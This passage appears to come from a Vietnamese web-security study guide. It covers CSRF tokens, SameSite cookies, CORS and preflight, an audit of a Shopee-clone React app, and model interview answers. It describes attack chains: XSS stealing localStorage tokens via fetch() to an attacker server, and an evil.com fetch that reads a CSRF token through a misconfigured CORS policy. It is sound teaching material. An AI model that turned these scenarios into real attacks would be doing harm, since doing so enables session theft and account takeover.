// Server verify: cookie.csrf === header.csrf

// Khi login, server set:
// Set-Cookie: csrf_token=abc123; Path=/; SameSite=Lax

// Frontend đọc cookie và gửi lại qua header:
axios.interceptors.request.use((config) => {
  const csrfToken = getCookie('csrf_token')
  if (csrfToken) {
    config.headers['X-CSRF-Token'] = csrfToken
  }
  return config
})

// evil.com CÓ THỂ trigger cookie gửi đi,
// nhưng KHÔNG THỂ đọc cookie value (SameSite)
// → KHÔNG THỂ set header X-CSRF-Token
```

#### 3. SameSite Cookie (Modern — Recommended)

```
┌──────────────────────────────────────────────────────────────────────┐
│                 SameSite Cookie Attribute                             │
├──────────────────────────────────────────────────────────────────────┤
│                                                                      │
│  Set-Cookie: session=abc; SameSite=Strict                            │
│  → Cookie KHÔNG bao giờ gửi cross-site                              │
│  → An toàn nhất, nhưng UX kém (link từ email không login)           │
│                                                                      │
│  Set-Cookie: session=abc; SameSite=Lax     ← MẶC ĐỊNH (Chrome 80+) │
│  → Cookie gửi với top-level navigation (click link)                  │
│  → Cookie KHÔNG gửi với POST/AJAX cross-site                        │
│  → Cân bằng tốt giữa security và UX                                │
│                                                                      │
│  Set-Cookie: session=abc; SameSite=None; Secure                      │
│  → Cookie gửi trong MỌI context (bao gồm cross-site)               │
│  → BẮT BUỘC phải có Secure flag (HTTPS only)                        │
│  → Dùng khi cần embed/iframe cross-site (payment widget, ...)       │
│                                                                      │
│  ⚠️ Chrome 80+ mặc định SameSite=Lax nếu không chỉ định            │
│     → Giảm đáng kể CSRF risk ngay cả khi dev không set              │
│                                                                      │
└──────────────────────────────────────────────────────────────────────┘
```

---

## 4. CORS — Cross-Origin Resource Sharing

### 4.1 Same-Origin Policy — Nền Tảng Của Mọi Thứ

```
┌──────────────────────────────────────────────────────────────────────────┐
│                  SAME-ORIGIN POLICY (SOP)                                │
├──────────────────────────────────────────────────────────────────────────┤
│                                                                          │
│  "Origin" = Protocol + Host + Port                                       │
│                                                                          │
│  https://shop.lehoangtrong.com:443/products                             │
│  ▲       ▲                     ▲    ▲                                   │
│  │       │                     │    └── Path (KHÔNG tính)               │
│  │       │                     └── Port                                  │
│  │       └── Host                                                        │
│  └── Protocol                                                            │
│                                                                          │
│  SOP Rule: JavaScript trên Origin A KHÔNG THỂ đọc response              │
│            từ Origin B (trừ khi B cho phép qua CORS)                     │
│                                                                          │
│  ┌──────────────────────────────────────────────────────────────────┐    │
│  │ Cùng Origin (✅ cho phép):                                       │    │
│  │   https://shop.com/page1 → https://shop.com/api/data            │    │
│  │   (cùng protocol, host, port)                                    │    │
│  │                                                                   │    │
│  │ Khác Origin (❌ bị chặn đọc response):                           │    │
│  │   https://shop.com → https://api.shop.com    (khác subdomain)   │    │
│  │   https://shop.com → http://shop.com          (khác protocol)    │    │
│  │   https://shop.com → https://shop.com:8080    (khác port)       │    │
│  │   https://shop.com → https://evil.com         (khác domain)     │    │
│  └──────────────────────────────────────────────────────────────────┘    │
│                                                                          │
│  ⚠️ QUAN TRỌNG: SOP chặn ĐỌC RESPONSE, không chặn GỬI REQUEST        │
│     → Đó là lý do CSRF vẫn hoạt động được                               │
│     → Request vẫn được gửi, server vẫn xử lý, browser chỉ chặn         │
│       JavaScript đọc response                                            │
│                                                                          │
└──────────────────────────────────────────────────────────────────────────┘
```

#### Cái gì bị SOP chặn, cái gì không?

```
┌───────────────────────────────────────────────────────────────────────┐
│  BỊ SOP CHẶN (cross-origin):                                         │
│  • XMLHttpRequest / fetch() — đọc response ❌                        │
│  • iframe contentDocument — đọc DOM ❌                                │
│  • Canvas drawImage cross-origin → getImageData ❌ (tainted canvas)  │
│                                                                       │
│  KHÔNG BỊ SOP CHẶN:                                                  │
│  • <img src="..."> — load hình cross-origin ✅                       │
│  • <script src="..."> — load JS cross-origin ✅ (JSONP lợi dụng)    │
│  • <link href="..."> — load CSS cross-origin ✅                      │
│  • <form action="..."> — submit form cross-origin ✅ (CSRF lợi dụng)│
│  • <video>, <audio> — load media cross-origin ✅                     │
│  • WebSocket — không bị SOP chặn ✅ (nhưng có Origin header)        │
│                                                                       │
│  "Gửi request" ≠ "Đọc response"                                      │
│  SOP cho phép GỬI, nhưng chặn ĐỌC                                   │
└───────────────────────────────────────────────────────────────────────┘
```

### 4.2 CORS Là Gì? Nó "Mở Khóa" Same-Origin Policy Như Thế Nào?

**CORS (Cross-Origin Resource Sharing)** là cơ chế dùng **HTTP headers** để server báo cho browser biết: "Tôi cho phép Origin X đọc response của tôi".

```
┌──────────────────────────────────────────────────────────────────────────┐
│                   CORS — Cơ Chế Hoạt Động                                │
├──────────────────────────────────────────────────────────────────────────┤
│                                                                          │
│  KHÔNG CÓ CORS:                                                         │
│  ┌────────────────────────────────────────────────────────────────────┐  │
│  │ shop.com → fetch("api.shop.com/products")                          │  │
│  │ Browser: "Origin khác! Chặn response! ❌"                         │  │
│  └────────────────────────────────────────────────────────────────────┘  │
│                                                                          │
│  CÓ CORS:                                                                │
│  ┌────────────────────────────────────────────────────────────────────┐  │
│  │ shop.com → fetch("api.shop.com/products")                          │  │
│  │                                                                    │  │
│  │ api.shop.com response headers:                                     │  │
│  │   Access-Control-Allow-Origin: https://shop.com  ← "cho phép"    │  │
│  │                                                                    │  │
│  │ Browser: "Server cho phép shop.com → pass response qua ✅"       │  │
│  └────────────────────────────────────────────────────────────────────┘  │
│                                                                          │
│  CORS Headers quan trọng (server trả về):                                │
│  ─────────────────────────────────────────                               │
│  Access-Control-Allow-Origin: https://shop.com    ← Origin nào cho phép │
│  Access-Control-Allow-Methods: GET, POST, PUT     ← Methods nào cho phép│
│  Access-Control-Allow-Headers: Authorization      ← Headers nào cho phép│
│  Access-Control-Allow-Credentials: true           ← Cho phép cookie?    │
│  Access-Control-Max-Age: 86400                    ← Cache preflight 24h │
│  Access-Control-Expose-Headers: X-Total-Count     ← Headers JS đọc được│
│                                                                          │
└──────────────────────────────────────────────────────────────────────────┘
```

### 4.3 Simple Request vs Preflight Request — Khi Nào Browser Gửi OPTIONS?

```
┌──────────────────────────────────────────────────────────────────────────┐
│              SIMPLE REQUEST vs PREFLIGHT REQUEST                          │
├──────────────────────────────────────────────────────────────────────────┤
│                                                                          │
│  SIMPLE REQUEST — Browser gửi thẳng, check CORS SAU                     │
│  ──────────────────────────────────────────────────                       │
│  Điều kiện (tất cả phải đúng):                                          │
│  • Method: GET, HEAD, hoặc POST                                         │
│  • Headers chỉ có: Accept, Accept-Language, Content-Language,            │
│    Content-Type (chỉ 3 giá trị dưới)                                    │
│  • Content-Type: application/x-www-form-urlencoded,                      │
│    multipart/form-data, hoặc text/plain                                  │
│                                                                          │
│  ┌─ Browser ─────────── Server ─┐                                       │
│  │  GET /api/products            │                                       │
│  │  Origin: https://shop.com     │                                       │
│  │ ─────────────────────────────►│                                       │
│  │                               │                                       │
│  │  200 OK                       │                                       │
│  │  Access-Control-Allow-Origin: │                                       │
│  │    https://shop.com           │                                       │
│  │◄──────────────────────────── │                                       │
│  │                               │                                       │
│  │  Browser check header → ✅   │                                       │
│  └───────────────────────────────┘                                       │
│                                                                          │
│  PREFLIGHT REQUEST — Browser gửi OPTIONS trước                           │
│  ─────────────────────────────────────────────                            │
│  Khi request KHÔNG đủ điều kiện simple:                                  │
│  • Method: PUT, DELETE, PATCH                                            │
│  • Custom headers: Authorization, X-Custom-Header                        │
│  • Content-Type: application/json    ← QUAN TRỌNG: hầu hết API dùng    │
│                                                                          │
│  ┌─ Browser ─────────────────── Server ─┐                               │
│  │                                       │                               │
│  │  ① OPTIONS /api/products (preflight)  │                               │
│  │  Origin: https://shop.com             │                               │
│  │  Access-Control-Request-Method: POST  │                               │
│  │  Access-Control-Request-Headers:      │                               │
│  │    Authorization, Content-Type        │                               │
│  │ ─────────────────────────────────────►│                               │
│  │                                       │                               │
│  │  204 No Content                       │                               │
│  │  Access-Control-Allow-Origin: *       │                               │
│  │  Access-Control-Allow-Methods:        │                               │
│  │    GET, POST, PUT, DELETE             │                               │
│  │  Access-Control-Allow-Headers:        │                               │
│  │    Authorization, Content-Type        │                               │
│  │  Access-Control-Max-Age: 86400        │                               │
│  │◄──────────────────────────────────── │                               │
│  │                                       │                               │
│  │  Browser: "Server cho phép → OK" ✅  │                               │
│  │                                       │                               │
│  │  ② POST /api/products (actual)       │                               │
│  │  Origin: https://shop.com             │                               │
│  │  Authorization: Bearer eyJ...         │                               │
│  │  Content-Type: application/json       │                               │
│  │ ─────────────────────────────────────►│                               │
│  │                                       │                               │
│  │  200 OK + data                        │                               │
│  │◄──────────────────────────────────── │                               │
│  └───────────────────────────────────────┘                               │
│                                                                          │
│  ⚠️ Dự án này gửi Content-Type: application/json + Authorization header │
│     → MỌI request API đều trigger PREFLIGHT (OPTIONS)                    │
│     → Server backend PHẢI handle OPTIONS method                          │
│                                                                          │
└──────────────────────────────────────────────────────────────────────────┘
```

### 4.4 CORS Trong Dự Án Này — Frontend Gọi API Khác Domain

```
  src/constant/config.ts — Cấu hình API URL
  ═══════════════════════════════════════════

  Frontend: https://shop.lehoangtrong.com        ← Origin A
  API:      https://api-ecom.duthanhduoc.com      ← Origin B (KHÁC DOMAIN!)
  Socket:   https://api-ecom.duthanhduoc.com      ← Origin B

  → Frontend và API có KHÁC ORIGIN
  → MỌI request API đều là CROSS-ORIGIN
  → CORS headers PHẢI được server cấu hình đúng
```

```
┌──────────────────────────────────────────────────────────────────────────┐
│          LUỒNG REQUEST THỰC TẾ TRONG DỰ ÁN                              │
├──────────────────────────────────────────────────────────────────────────┤
│                                                                          │
│  shop.lehoangtrong.com                  api-ecom.duthanhduoc.com        │
│  (React SPA)                            (Express/NestJS API)            │
│       │                                        │                         │
│       │  ① OPTIONS /products                   │                         │
│       │  Origin: https://shop.lehoangtrong.com │                         │
│       │  Access-Control-Request-Method: GET     │                         │
│       │  Access-Control-Request-Headers:        │                         │
│       │    authorization, content-type          │                         │
│       │ ──────────────────────────────────────► │                         │
│       │                                        │                         │
│       │  204 No Content                        │                         │
│       │  Access-Control-Allow-Origin: *        │ ← Server cho phép mọi  │
│       │  Access-Control-Allow-Methods:         │   origin (wildcard)     │
│       │    GET,POST,PUT,DELETE                 │                         │
│       │  Access-Control-Allow-Headers:         │                         │
│       │    authorization,content-type,...       │                         │
│       │ ◄──────────────────────────────────── │                         │
│       │                                        │                         │
│       │  ② GET /products                       │                         │
│       │  Authorization: Bearer eyJhbGci...     │                         │
│       │  Content-Type: application/json        │                         │
│       │ ──────────────────────────────────────► │                         │
│       │                                        │                         │
│       │  200 OK + { data: [...products] }      │                         │
│       │ ◄──────────────────────────────────── │                         │
│                                                                          │
│  axios.create({                                                          │
│    baseURL: 'https://api-ecom.duthanhduoc.com/',                        │
│    headers: { 'Content-Type': 'application/json' }                      │
│    // withCredentials: true  ← COMMENTED OUT                             │
│  })                                                                      │
│                                                                          │
│  → Content-Type: application/json = NOT simple request                   │
│  → Authorization header = NOT simple request                             │
│  → Mỗi API call = 2 requests (OPTIONS + actual)                        │
│  → Access-Control-Max-Age giúp cache preflight để tối ưu                │
│                                                                          │
└──────────────────────────────────────────────────────────────────────────┘
```

### 4.5 withCredentials & Cookie — Mối Liên Hệ CORS + CSRF

```
┌──────────────────────────────────────────────────────────────────────────┐
│             withCredentials — Khi Nào Cần Bật?                           │
├──────────────────────────────────────────────────────────────────────────┤
│                                                                          │
│  withCredentials: false (MẶC ĐỊNH — dự án này đang dùng)                │
│  ────────────────────────────────────────────────────────                 │
│  • Browser KHÔNG gửi cookie cross-origin                                 │
│  • Browser KHÔNG gửi Authorization header tự động                       │
│  • Server CÓ THỂ dùng Access-Control-Allow-Origin: * (wildcard)        │
│  • ✅ An toàn hơn với CSRF                                              │
│                                                                          │
│  withCredentials: true                                                   │
│  ──────────────────                                                      │
│  • Browser GỬI cookie cross-origin                                       │
│  • Server KHÔNG ĐƯỢC dùng wildcard * cho Allow-Origin                   │
│    → PHẢI chỉ định cụ thể: Access-Control-Allow-Origin: https://shop.com│
│  • Server PHẢI set: Access-Control-Allow-Credentials: true              │
│  • ⚠️ MỞ CỬA cho CSRF nếu không có CSRF token                         │
│                                                                          │
│  Dự án này comment out withCredentials vì:                               │
│  → Dùng JWT trong localStorage + gửi qua Authorization header          │
│  → KHÔNG cần cookie cross-origin                                        │
│  → Server dùng wildcard * cho Allow-Origin → đơn giản hơn              │
│                                                                          │
│  ⚠️ Nếu chuyển sang httpOnly cookie cho JWT:                            │
│  → PHẢI bật withCredentials: true                                        │
│  → PHẢI thêm CSRF protection                                            │
│  → Server PHẢI chỉ định Allow-Origin cụ thể (không wildcard)           │
│                                                                          │
└──────────────────────────────────────────────────────────────────────────┘
```

### 4.6 CORS Errors Thường Gặp & Cách Debug

#### Error 1: "No 'Access-Control-Allow-Origin' header"

```
┌─────────────────────────────────────────────────────────────────────┐
│  ❌ Access to fetch at 'https://api.example.com/data' from origin  │
│     'https://app.example.com' has been blocked by CORS policy:     │
│     No 'Access-Control-Allow-Origin' header is present on the      │
│     requested resource.                                             │
├─────────────────────────────────────────────────────────────────────┤
│                                                                     │
│  Nguyên nhân: Server KHÔNG trả về CORS headers                     │
│  Fix: Backend thêm header Access-Control-Allow-Origin               │
│                                                                     │
│  // Express.js                                                      │
│  app.use(cors({ origin: 'https://app.example.com' }))              │
│                                                                     │
│  // NestJS                                                          │
│  app.enableCors({ origin: 'https://app.example.com' })             │
│                                                                     │
│  // Nginx                                                           │
│  add_header Access-Control-Allow-Origin "https://app.example.com"; │
│                                                                     │
└─────────────────────────────────────────────────────────────────────┘
```

#### Error 2: "Wildcard '*' cannot be used with credentials"

```
┌─────────────────────────────────────────────────────────────────────┐
│  ❌ Access to fetch has been blocked: The value of the             │
│     'Access-Control-Allow-Origin' header must not be the wildcard  │
│     '*' when the request's credentials mode is 'include'.          │
├─────────────────────────────────────────────────────────────────────┤
│                                                                     │
│  Nguyên nhân: Frontend bật withCredentials: true                   │
│               + Server dùng wildcard *                              │
│                                                                     │
│  Fix:                                                               │
│  Option A: Server chỉ định origin cụ thể (recommended)            │
│    Access-Control-Allow-Origin: https://shop.lehoangtrong.com      │
│    Access-Control-Allow-Credentials: true                           │
│                                                                     │
│  Option B: Tắt withCredentials ở frontend (nếu không cần cookie)  │
│    axios.create({ withCredentials: false })                         │
│                                                                     │
└─────────────────────────────────────────────────────────────────────┘
```

#### Error 3: "Method PUT is not allowed"

```
┌─────────────────────────────────────────────────────────────────────┐
│  ❌ Method PUT is not allowed by Access-Control-Allow-Methods      │
│     in preflight response.                                          │
├─────────────────────────────────────────────────────────────────────┤
│                                                                     │
│  Nguyên nhân: Server chưa cho phép method PUT trong CORS config    │
│                                                                     │
│  Fix: Backend thêm PUT vào allowed methods                         │
│  Access-Control-Allow-Methods: GET, POST, PUT, DELETE, PATCH       │
│                                                                     │
└─────────────────────────────────────────────────────────────────────┘
```

#### Error 4: "Request header field authorization is not allowed"

```
┌─────────────────────────────────────────────────────────────────────┐
│  ❌ Request header field authorization is not allowed by            │
│     Access-Control-Allow-Headers in preflight response.            │
├─────────────────────────────────────────────────────────────────────┤
│                                                                     │
│  Nguyên nhân: Server chưa cho phép Authorization header            │
│                                                                     │
│  Fix: Backend thêm vào allowed headers                             │
│  Access-Control-Allow-Headers: Authorization, Content-Type         │
│                                                                     │
│  ⚠️ Dự án này gửi authorization header trong mọi authenticated    │
│     request → Server PHẢI allow header này                          │
│                                                                     │
└─────────────────────────────────────────────────────────────────────┘
```

#### Debug CORS như thế nào?

```
┌──────────────────────────────────────────────────────────────────────┐
│                 CORS DEBUG CHECKLIST                                  │
├──────────────────────────────────────────────────────────────────────┤
│                                                                      │
│  1. Mở DevTools → Network tab                                       │
│  2. Filter: Fetch/XHR                                                │
│  3. Tìm request bị lỗi (thường đỏ)                                 │
│  4. Check:                                                           │
│     • Có request OPTIONS không? (preflight)                          │
│     • OPTIONS response status? (phải 200/204)                       │
│     • Response headers có Access-Control-Allow-* không?              │
│     • Origin trong request có match Allow-Origin không?              │
│                                                                      │
│  Quick test với curl (bypass CORS vì curl không phải browser):      │
│  $ curl -I https://api-ecom.duthanhduoc.com/products                │
│  → Nếu curl OK nhưng browser lỗi → chắc chắn là CORS issue        │
│                                                                      │
│  ⚠️ CORS là BROWSER mechanism — server vẫn nhận và xử lý request   │
│     Browser chặn JavaScript đọc response, không chặn request        │
│                                                                      │
└──────────────────────────────────────────────────────────────────────┘
```

---

## 5. Mối Liên Hệ Giữa XSS, CSRF, CORS — Bức Tranh Toàn Cảnh

```
┌──────────────────────────────────────────────────────────────────────────────┐
│               MỐI LIÊN HỆ XSS ↔ CSRF ↔ CORS                                │
├──────────────────────────────────────────────────────────────────────────────┤
│                                                                              │
│  ┌─── XSS ───┐     ┌─── CSRF ──┐     ┌─── CORS ──┐                        │
│  │ Inject     │     │ Giả mạo   │     │ Cho phép  │                        │
│  │ script     │────►│ request   │     │ cross-    │                        │
│  │ vào site   │     │ từ site   │     │ origin    │                        │
│  └────────────┘     │ khác      │     │ access    │                        │
│       │              └───────────┘     └───────────┘                        │
│       │                    ▲                  │                              │
│       │                    │                  │                              │
│       └────────────────────┘                  │                              │
│       XSS có thể bypass                      │                              │
│       CSRF protection vì                     │                              │
│       code chạy cùng origin                  │                              │
│                                               │                              │
│  ┌────────────────────────────────────────────┘                              │
│  │  CORS misconfiguration                                                    │
│  │  có thể giúp attacker                                                    │
│  │  đọc CSRF token từ response                                              │
│  └──────────────────────────────────────────────────────────────────────     │
│                                                                              │
│  === CHUỖI TẤN CÔNG THỰC TẾ ===                                            │
│                                                                              │
│  Scenario 1: XSS → Bypass Everything                                        │
│  ─────────────────────────────────────                                       │
│  1. Attacker tìm được XSS vulnerability                                     │
│  2. Inject script chạy CÙNG ORIGIN với website                              │
│  3. Script đọc được:                                                        │
│     • localStorage (access_token, refresh_token) ← DỰ ÁN NÀY              │
│     • cookies (kể cả không httpOnly)                                        │
│     • CSRF tokens trong DOM/meta tags                                       │
│     • Mọi data trên page                                                    │
│  4. Gửi về server attacker qua fetch() (cùng origin → CORS ok)             │
│                                                                              │
│  → KẾT LUẬN: XSS bypass CẢ CSRF protection VÀ CORS                        │
│  → CHỐNG XSS LÀ ƯU TIÊN SỐ 1                                              │
│                                                                              │
│  Scenario 2: CORS Misconfiguration → Enable CSRF                            │
│  ─────────────────────────────────────────────────                           │
│  1. Server set: Access-Control-Allow-Origin: * + Allow-Credentials: true    │
│     (cấu hình SAI — browser sẽ chặn nhưng một số phiên bản cũ không)      │
│  2. Hoặc server reflect Origin header mà không validate:                     │
│     Access-Control-Allow-Origin: [whatever Origin request gửi]              │
│  3. Attacker trên evil.com:                                                  │
│     • fetch(target.com/api/csrf-token, {credentials: 'include'})            │
│     • Đọc được CSRF token từ response                                       │
│     • Dùng token này để forge request → CSRF thành công                     │
│                                                                              │
│  Scenario 3: Token-based Auth — Giảm Attack Surface                         │
│  ────────────────────────────────────────────────────                        │
│  Dự án Shopee Clone dùng JWT + localStorage + Authorization header:         │
│  • CSRF: ✅ Immune — evil.com không đọc được localStorage                  │
│  • CORS: ✅ Server dùng wildcard * — đơn giản, không cần credentials       │
│  • XSS: ⚠️ Điểm yếu duy nhất — nếu XSS → đọc được token từ localStorage │
│                                                                              │
│  → Defense priority: XSS > CORS > CSRF (trong kiến trúc này)               │
│                                                                              │
└──────────────────────────────────────────────────────────────────────────────┘
```

---

## 6. Phân Tích Bảo Mật Thực Tế Trong Codebase Shopee Clone

```
┌──────────────────────────────────────────────────────────────────────────┐
│           SECURITY AUDIT — SHOPEE CLONE TYPESCRIPT                       │
├──────────────────────────────────────────────────────────────────────────┤
│                                                                          │
│  ✅ ĐÃ LÀM TỐT                                                         │
│  ═══════════════                                                         │
│                                                                          │
│  1. XSS — DOMPurify cho product description                              │
│     File: src/pages/ProductDetail/ProductDetail.tsx:2, 359-362           │
│     → Sanitize HTML trước khi render qua dangerouslySetInnerHTML        │
│                                                                          │
│  2. JWT + Header-based auth (chống CSRF tự nhiên)                       │
│     File: src/utils/http.ts:38-65                                        │
│     → Token trong localStorage, gửi qua Authorization header            │
│     → withCredentials commented out                                      │
│                                                                          │
│  3. Input validation với Zod                                             │
│     File: src/utils/rules.ts                                             │
│     → Email, password validation trước khi gửi API                      │
│                                                                          │
│  4. React auto-escaping                                                  │
│     → Mọi JSX {variable} đều được escape tự động                       │
│     → Chỉ có 2 chỗ dùng dangerouslySetInnerHTML                        │
│                                                                          │
│  5. Token refresh mechanism                                              │
│     File: src/utils/http.ts:117-127, 150-172                             │
│     → Access token hết hạn → auto refresh                               │
│     → Refresh token hết hạn → clear LS + redirect login                 │
│                                                                          │
│  ─────────────────────────────────────────────────────────────────────   │
│                                                                          │
│  ⚠️ CÓ THỂ CẢI THIỆN                                                    │
│  ════════════════════                                                    │
│                                                                          │
│  1. localStorage cho token — dễ bị XSS đọc                              │
│     Risk: Nếu có XSS → attacker đọc access_token + refresh_token       │
│     Alternative: httpOnly cookie (nhưng cần CSRF protection)             │
│     Trade-off: localStorage + aggressive XSS prevention vs              │
│                httpOnly cookie + CSRF tokens                             │
│                                                                          │
│  2. Breadcrumb dùng dangerouslySetInnerHTML KHÔNG sanitize               │
│     File: src/components/Breadcrumb/Breadcrumb.tsx:34                    │
│     Code: dangerouslySetInnerHTML={{ __html: JSON.stringify(...) }}       │
│     Risk: Thấp — data là JSON-LD structured data, không phải user input │
│     Nhưng: Nếu product name chứa HTML → có thể bị inject               │
│                                                                          │
│  3. Không có CSP header                                                  │
│     → Nếu có XSS, không có lớp phòng thủ cuối để chặn script           │
│     → Nên thêm CSP ở server level (Nginx/CloudFront)                    │
│                                                                          │
│  4. Không validate URL protocol trước khi render                         │
│     → Nếu có link từ user (product URL, review link, ...)               │
│     → Cần check: chỉ cho phép https:// và http://                       │
│     → Chặn javascript:, data:, vbscript:                                │
│                                                                          │
│  5. DOMPurify dùng default config                                        │
│     → Nên dùng strict config cho product description                    │
│     → Chỉ whitelist tags/attributes thực sự cần                        │
│                                                                          │
└──────────────────────────────────────────────────────────────────────────┘
```

### Bảng So Sánh Token Storage Strategies

```
┌─────────────────────┬─────────────────────┬─────────────────────────────┐
│                     │  localStorage       │  httpOnly Cookie             │
│                     │  (DỰ ÁN NÀY)       │  (Alternative)              │
├─────────────────────┼─────────────────────┼─────────────────────────────┤
│ XSS Impact          │ ❌ Token bị đánh cắp│ ✅ JS không đọc được cookie│
│ CSRF Impact         │ ✅ Immune           │ ❌ Cần CSRF protection      │
│ Implementation      │ ✅ Đơn giản         │ 🟡 Phức tạp hơn           │
│ Cross-domain        │ ✅ Dễ (header)      │ 🟡 Cần withCredentials     │
│ Token access in JS  │ ✅ Đọc được         │ ❌ Không đọc được          │
│ Auto-send           │ ❌ Phải gắn manual  │ ✅ Browser tự gửi          │
│ Server-side render  │ ❌ Không có ở server│ ✅ Có trong mọi request    │
│ Tab/window sharing  │ ✅ Shared tự động   │ ✅ Shared tự động          │
│ Logout cleanup      │ 🟡 Phải clear manual│ ✅ Server set max-age=0    │
├─────────────────────┼─────────────────────┼─────────────────────────────┤
│ Best for            │ SPA, cross-domain   │ Same-domain, SSR,          │
│                     │ API, simple setup   │ high-security apps          │
└─────────────────────┴─────────────────────┴─────────────────────────────┘

Recommendation cho dự án này:
→ localStorage + aggressive XSS prevention là LỰA CHỌN HỢP LÝ
→ Vì: SPA architecture, cross-domain API, không cần SSR
→ Điều kiện: DOMPurify + CSP + no eval() + strict input validation
```

---

## 7. Câu Hỏi Phỏng Vấn Thường Gặp & Cách Trả Lời

### Q1: "XSS là gì? Có mấy loại? Cách phòng chống ở Frontend?"

```
Trả lời mẫu (2-3 phút):

"XSS — Cross-Site Scripting — là kỹ thuật attacker inject JavaScript
độc hại vào website, chạy trong browser của user khác.

Có 3 loại chính:

1. Stored XSS — nguy hiểm nhất: Payload lưu trong database (ví dụ comment,
   review), mọi user xem đều bị tấn công.

2. Reflected XSS — phổ biến nhất: Payload nằm trong URL, server phản hồi
   lại không sanitize. Cần lừa victim click link.

3. DOM-based XSS — khó phát hiện nhất: Hoàn toàn client-side, JavaScript
   đọc data từ URL rồi ghi vào DOM không an toàn. Server không biết gì.

Phòng chống ở Frontend:
- React mặc định auto-escape JSX output — lớp bảo vệ cơ bản
- Khi BẮT BUỘC dùng dangerouslySetInnerHTML → DOMPurify.sanitize()
- Validate URL: chặn javascript: protocol
- Content Security Policy header ở server
- Không dùng eval(), innerHTML nếu có thể tránh

Trong dự án thực tế của tôi, tôi dùng DOMPurify cho product description
vì description từ server có thể chứa HTML formatting (bold, table, image),
cần render HTML thật nhưng phải strip scripts và event handlers."
```

### Q2: "CSRF là gì? Khác gì XSS? Dự án của bạn chống CSRF thế nào?"

```
Trả lời mẫu (2-3 phút):

"CSRF — Cross-Site Request Forgery — attacker lừa browser victim gửi
request đến server mà victim đã login, sử dụng chính cookie/session
của victim.

Khác XSS ở chỗ:
- XSS: inject CODE vào website, code chạy cùng origin → truy cập mọi thứ
- CSRF: KHÔNG inject code, chỉ tạo request GIẢ từ site khác,
  lợi dụng browser tự gửi cookie

Dự án của tôi dùng JWT + localStorage + Authorization header:
- Token lưu trong localStorage → evil.com không đọc được (Same-Origin Policy)
- Token gửi qua Authorization header → browser KHÔNG tự động gửi header này
- Không dùng cookie auth → CSRF không có gì để lợi dụng
- withCredentials: false → không gửi cookie cross-origin

→ Kiến trúc này IMMUNE với CSRF.

Nhưng nếu dùng httpOnly cookie cho JWT (pattern khác), sẽ cần:
- SameSite=Lax cookie attribute (Chrome 80+ mặc định)
- CSRF token (Synchronizer Token hoặc Double Submit Cookie)
- Verify Origin/Referer header ở server"
```

### Q3: "CORS là gì? Giải thích preflight request? Bạn đã gặp CORS error chưa?"

```
Trả lời mẫu (2-3 phút):

"CORS — Cross-Origin Resource Sharing — là cơ chế cho phép server
báo browser: 'tôi cho phép origin X đọc response của tôi'.

Nền tảng là Same-Origin Policy: browser chặn JavaScript đọc response
từ origin khác. CORS là cách 'nới lỏng' SOP có kiểm soát.

Preflight request xảy ra khi request KHÔNG phải 'simple request'.
Ví dụ: Content-Type: application/json, hoặc có custom header như
Authorization → browser gửi OPTIONS request trước để hỏi server
có cho phép không. Nếu server trả về đúng CORS headers → browser
mới gửi actual request.

Trong dự án của tôi:
- Frontend: shop.lehoangtrong.com
- API: api-ecom.duthanhduoc.com → KHÁC ORIGIN
- Mọi API call đều cross-origin → đều có preflight
- Vì gửi Content-Type: application/json + Authorization header

CORS error phổ biến nhất tôi gặp:
'No Access-Control-Allow-Origin header' → Backend chưa cấu hình CORS
Fix: Thêm cors middleware ở Express/NestJS

Trick debug: dùng curl gọi cùng URL — nếu curl OK nhưng browser lỗi
→ chắc chắn là CORS issue (vì curl không phải browser, không enforce SOP)"
```

### Q4: "Token lưu localStorage vs httpOnly cookie — ưu nhược điểm?"

```
Trả lời mẫu (2 phút):

"localStorage:
+ Đơn giản, dễ implement
+ CSRF immune (browser không tự gửi)
+ Dễ cross-domain (gửi qua header)
- XSS có thể đọc token

httpOnly cookie:
+ XSS không đọc được (JS không access httpOnly cookie)
+ Browser tự gửi (không cần code)
- Dễ bị CSRF (browser tự gửi cookie cross-origin)
- Cần CSRF token + SameSite + specific CORS origin
- Phức tạp hơn với cross-domain API

Lựa chọn phụ thuộc vào kiến trúc:
- SPA + cross-domain API → localStorage + aggressive XSS prevention
- SSR + same-domain → httpOnly cookie + CSRF protection
- High-security (banking) → httpOnly cookie + CSRF + CSP + short-lived tokens

Dự án của tôi chọn localStorage vì SPA architecture, cross-domain API,
và đổi lại phải chống XSS rất nghiêm ngặt — DOMPurify, Zod validation,
không eval(), CSP headers."
```

### Q5: "Nếu website của bạn bị XSS thì hậu quả gì? Làm sao phát hiện?"

```
Trả lời mẫu (2 phút):

"Hậu quả nếu XSS:
1. Đọc localStorage → lấy access_token + refresh_token → chiếm tài khoản
2. Keylogging → ghi lại mọi thứ user gõ (mật khẩu, thẻ tín dụng)
3. Phishing → modify DOM hiện form login giả
4. Crypto mining → dùng CPU user
5. Lan truyền — stored XSS tự nhân bản (worm)

Phát hiện:
- Static analysis: CodeQL (GitHub), ESLint plugin (eslint-plugin-xss)
- Dynamic testing: OWASP ZAP, Burp Suite scan
- Code review: grep dangerouslySetInnerHTML, innerHTML, eval
- CSP report-uri: browser báo khi script bị chặn
- npm audit: phát hiện dependencies có CVE liên quan XSS
- Bug bounty program: trả tiền cho security researcher tìm lỗi

Trong CI/CD pipeline, dự án nên có:
- npm audit trong CI
- CodeQL scan (GitHub Actions đã cấu hình — ZZ_43)
- ESLint rules chặn eval, innerHTML"
```

---

## 8. Tổng Kết & Recommendations

```
┌──────────────────────────────────────────────────────────────────────────────┐
│                         TỔNG KẾT                                             │
├──────────────────────────────────────────────────────────────────────────────┤
│                                                                              │
│  XSS (Cross-Site Scripting)                                                  │
│  ═════════════════════════                                                   │
│  • Inject script vào website, chạy trong browser victim                      │
│  • 3 loại: Stored (DB), Reflected (URL), DOM-based (client)                 │
│  • React auto-escape giúp, NHƯNG dangerouslySetInnerHTML bypass              │
│  • Fix: DOMPurify + CSP + validate input + no eval()                        │
│  • ⚠️ XSS bypass CẢ CSRF protection                                        │
│                                                                              │
│  CSRF (Cross-Site Request Forgery)                                           │
│  ════════════════════════════════                                            │
│  • Giả mạo request từ site khác, lợi dụng cookie tự động gửi              │
│  • Chỉ nguy hiểm khi dùng cookie-based auth                                │
│  • JWT + header-based auth = IMMUNE (dự án này)                             │
│  • Fix: SameSite cookie + CSRF token + verify Origin                        │
│                                                                              │
│  CORS (Cross-Origin Resource Sharing)                                        │
│  ═══════════════════════════════════                                         │
│  • Cơ chế cho phép cross-origin API calls                                   │
│  • Simple request vs Preflight (OPTIONS)                                     │
│  • Misconfiguration → leak data, enable CSRF                                │
